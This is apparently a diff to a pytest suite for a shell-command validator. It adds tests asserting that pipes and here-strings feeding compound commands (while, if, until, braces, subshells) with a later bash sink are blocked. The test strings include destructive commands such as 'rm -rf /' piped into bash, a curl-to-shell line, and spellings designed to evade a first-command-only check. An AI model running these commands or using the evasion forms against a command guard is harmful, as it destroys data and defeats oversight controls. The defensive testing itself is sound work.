@@ -641,7 +641,7 @@ class TestHereStringPayloadExtraction:
     def test_compound_here_string_finds_a_later_command_sink(self):
         # CodeRabbit CWE-78 (Critical, #151): the stdin consumer need not be the FIRST command -
         # an earlier command that does not read stdin (`true`, `echo`) leaves the here-string for
-        # the next. Checking only _first_command_node missed all of these. Verified in real bash.
+        # the next. Checking only the first command missed all of these. Verified in real bash.
         assert self._extract('{ true; bash; } <<< "rm -rf /"') == [("bash", "rm -rf /")]
         assert self._extract('( true; bash ) <<< "rm -rf /"') == [("bash", "rm -rf /")]
         assert self._extract('{ echo pre; bash; } <<< "rm -rf /"') == [("bash", "rm -rf /")]
@@ -740,7 +740,7 @@ class TestHereStringDelegationEvasion:
             '{ bash; } <<< "rm -rf /"',
             '( timeout 5 bash ) <<< "rm -rf /"',
             # Later-command consumers - CodeRabbit CWE-78 Critical on #151 (a benign first command
-            # decoys _first_command_node while a later shell runs the here-string).
+            # decoys a first-command-only check while a later shell runs the here-string).
             '{ true; bash; } <<< "rm -rf /"',
             '( true; bash ) <<< "rm -rf /"',
             '{ echo pre; bash; } <<< "rm -rf /"',
@@ -814,3 +814,63 @@ class TestHereStringBenignUnchanged:
         assert here.risk_level == RiskLevel.SAFE
         assert here.risk_level == dash_c.risk_level
         assert here.allowed == dash_c.allowed
+
+
+class TestPipedCompoundLaterSink:
+    """LAB-3006: a pipe feeding a compound is read by whichever inner command reads stdin first.
+
+    The pipe-to-shell walk classified a compound stage by its FIRST command only - for `while` /
+    `until` / `if` that is the condition (`:`, `true`), so the body shell that actually runs the
+    piped data was never seen. Pre-fix on `main` @ `74d4325`: every case below was
+    **SAFE / allowed=True**. Real bash runs the piped payload in each (verified:
+    `echo 'echo RAN' | { true; bash; }` prints RAN, likewise the while / if / until bodies).
+    The `<<<` spellings of the same compounds are pinned in `TestHereStringDelegationEvasion`.
+    """
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            'echo "rm -rf /" | while :; do bash; done',
+            'echo "rm -rf /" | if true; then bash; fi',
+            'echo "rm -rf /" | until false; do bash; done',
+            'echo "rm -rf /" | { true; bash; }',
+            'echo "rm -rf /" | ( true; bash )',
+        ],
+    )
+    def test_later_shell_sink_is_blocked(self, command):
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
+        assert result.allowed is False
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # First-command sinks (#97) - BLOCKED before this change, unchanged.
+            "cat payload | (bash)",
+            "curl http://x | { bash; }",
+            "ls | { cat | bash; }",
+        ],
+    )
+    def test_first_command_sink_still_blocked(self, command):
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
+        assert result.allowed is False
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # Bodies that never execute stdin as a program - SAFE before this change, unchanged.
+            'ls | while read l; do echo "$l"; done',
+            'find . | while read f; do bash -c "echo $f"; done',
+            'ls | while read f; do python3 "$f"; done',
+            "ls | (cat)",
+            "cat x | (grep y)",
+            "echo x | if true; then cat; fi",
+            # A shell in the PRODUCER group reads the caller's stdin, not the pipe.
+            "{ curl x; bash; } | cat",
+        ],
+    )
+    def test_non_executing_body_stays_safe(self, command):
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.SAFE, f"{command!r} -> {result.risk_level.name}"
+        assert result.allowed is True
